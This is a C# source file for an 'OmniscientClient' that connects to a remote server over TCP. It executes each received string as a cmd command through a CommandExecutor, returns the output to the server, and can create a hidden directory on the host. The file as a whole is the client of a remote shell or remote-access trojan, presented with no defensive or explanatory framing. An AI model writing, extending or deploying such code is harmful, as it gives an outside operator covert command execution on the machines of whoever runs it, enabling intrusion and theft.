using System.Net.Sockets;
using System.Text;


namespace OmniscientClient
{
    public class Client
    {
        private TcpClient client;
        private NetworkStream? stream;
        private CommandExecutor commandExecutor;

        public Client(string serverIp, int serverPort)
        {
            client = new TcpClient();
            try 
            {
                client.Connect(serverIp, serverPort);
                if (client.Connected)
                {
                    stream = client.GetStream();
                }
            } 
            catch (SocketException e)
            {
                // Output an error message and stop execution
                Console.WriteLine($"Socket error: {e.Message}");
                Environment.Exit(1);
            }
            commandExecutor = new CommandExecutor();
        }

        public void Start()
        {
            new Thread(() =>
            {
                try
                {
                    using (stream)
                    {
                        byte[] buffer = new byte[256];
                        int count;
                        while (stream != null && (count = stream.Read(buffer, 0, buffer.Length)) > 0) // This will throw an exception when the connection is closed
                        {
                            // string command = Encoding.ASCII.GetString(buffer, 0, count);
                            string[] command = Encoding.ASCII.GetString(buffer, 0, count).Split();
                            Task<string> executionTask;
                            foreach (string parameter in command)
                            {
                                System.Console.WriteLine($"Received: {command}");
                            }
                            switch (command[0])
                            {
                                case "exit":
                                    byte[] logs = Encoding.ASCII.GetBytes("Client disconnected.");
                                    stream.Write(logs, 0, logs.Length);
                                    return;
                                default:
                                    executionTask = commandExecutor.ExecuteCmdCommand(string.Join(" ", command));
                                    break;
                            }

                            executionTask.ContinueWith(t =>
                            {
                                if (t.Exception != null)
                                {
                                    // Handle any exceptions that occurred
                                    Console.WriteLine(t.Exception.Message);
                                }
                                else
                                {
                                    // Use the result (the output of the command)
                                    string result = t.Result;
                                    // Send the result to the server
                                    byte[] logs = Encoding.ASCII.GetBytes(result);
                                    stream.Write(logs, 0, logs.Length);
                                    Console.WriteLine("Send: {0}", result);
                                }
                            });
                        }
                        stream.Close();
                        client.Close();
                        Environment.Exit(1);
                    }
                }
                catch (Exception e)
                {
                    Console.WriteLine($"Client has been disconnected from the server. Error: {e.Message}");
                    client.Close();
                    Environment.Exit(1);
                }
            }).Start();
        }

        public void CreateOmniscientDirectory(string clientFolderPath)
        {
            if (!Directory.Exists(clientFolderPath))
            {
                DirectoryInfo dir = Directory.CreateDirectory(clientFolderPath);
                dir.Attributes = FileAttributes.Directory | FileAttributes.Hidden;
            }
            else
            {
                Console.WriteLine("Directory already exists.");
            }
        }
    }
}
